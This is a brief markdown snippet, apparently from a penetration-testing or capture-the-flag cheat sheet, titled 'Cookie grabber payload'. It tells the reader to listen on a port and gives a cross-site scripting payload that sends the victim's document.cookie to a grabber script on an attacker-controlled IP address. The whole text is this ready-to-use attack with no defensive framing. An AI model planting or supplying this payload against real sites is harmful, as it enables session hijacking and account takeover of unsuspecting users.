## Cookie grabber payload
listen on the specified port and use the payload:
```
<script>document.location='http://10.11.28.137:3333/XSS/grabber.php?c='+document.cookie</script>
```